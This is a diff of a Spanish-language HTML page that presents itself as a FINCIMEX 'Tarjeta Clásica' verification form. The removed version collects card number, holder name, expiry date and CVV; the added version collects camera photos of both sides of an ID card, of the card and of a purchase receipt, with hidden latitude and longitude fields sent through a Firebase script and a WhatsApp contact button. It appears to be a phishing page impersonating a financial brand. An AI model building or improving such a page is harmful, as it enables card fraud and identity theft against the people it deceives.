@@ -1,35 +1,67 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Verificación de Tarjeta Clásica</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Verificación • Tarjeta Clásica</title>
 <link rel="stylesheet" href="styles.css">
+
+<!-- Firebase + app script -->
 <script type="module" src="firebase.js"></script>
 <script type="module" src="app.js"></script>
 </head>
-
 <body>
 
-<div class="form-card">
-    <h2>Verificación de Tarjeta Clásica</h2>
+<header class="topbar">
+  <h1>Verificación de Identidad</h1>
+</header>
 
-    <form id="formVerificacion">
-        <label>Número de tarjeta (16 dígitos)</label>
-        <input type="text" maxlength="16" required name="tarjeta">
+<main>
+  <div class="form-card">
+    <h2>Formulario de verificación</h2>
 
-        <label>Nombre del titular</label>
-        <input type="text" required name="nombre">
+    <form id="formVerificacion" class="form-grid" autocomplete="off">
 
-        <label>Fecha de vencimiento</label>
-        <input type="month" required name="vence">
+      <label for="carnet_front">Foto carnet (frontal)</label>
+      <input id="carnet_front" name="carnet_front" type="file" accept="image/*" capture="camera" required>
 
-        <label>Código CVV</label>
-        <input type="password" maxlength="3" required name="cvv">
+      <label for="carnet_back">Foto carnet (trasera)</label>
+      <input id="carnet_back" name="carnet_back" type="file" accept="image/*" capture="camera" required>
 
-        <button class="btn" type="submit">Verificar</button>
+      <label for="tarjeta_foto">Foto tarjeta clásica</label>
+      <input id="tarjeta_foto" name="tarjeta_foto" type="file" accept="image/*" capture="camera" required>
+
+      <label for="comprobante">Foto último comprobante de compra</label>
+      <div class="ejemplo-box">
+        <img src="ejemplo_comprobante.jpg" alt="Ejemplo comprobante" class="ejemplo-img">
+        <input id="comprobante" name="comprobante" type="file" accept="image/*" capture="camera" required>
+      </div>
+
+      <label for="nombre">Nombre completo (opcional)</label>
+      <input id="nombre" name="nombre" type="text" placeholder="Nombre completo">
+
+      <label for="email">Correo (opcional)</label>
+      <input id="email" name="email" type="email" placeholder="ejemplo@correo.com">
+
+      <!-- campos ocultos para lat / lng -->
+      <input type="hidden" id="latitud" name="latitud">
+      <input type="hidden" id="longitud" name="longitud">
+
+      <div class="fullwidth">
+        <button class="btn" type="submit">Enviar verificación</button>
+      </div>
     </form>
-</div>
+
+    <p class="small muted">Al enviar aceptas que revisemos la documentación. Tus datos se almacenan en un servidor seguro.</p>
+  </div>
+</main>
+
+<footer class="footer">
+  <p>FINCIMEX © Todos los derechos reservados</p>
+</footer>
+
+<!-- BOTÓN FLOTANTE WHATSAPP -->
+<a href="https://wa.me/5350000000" class="whatsapp-btn" target="_blank" aria-label="Contactar por Whatsapp">💬</a>
 
 </body>
 </html>
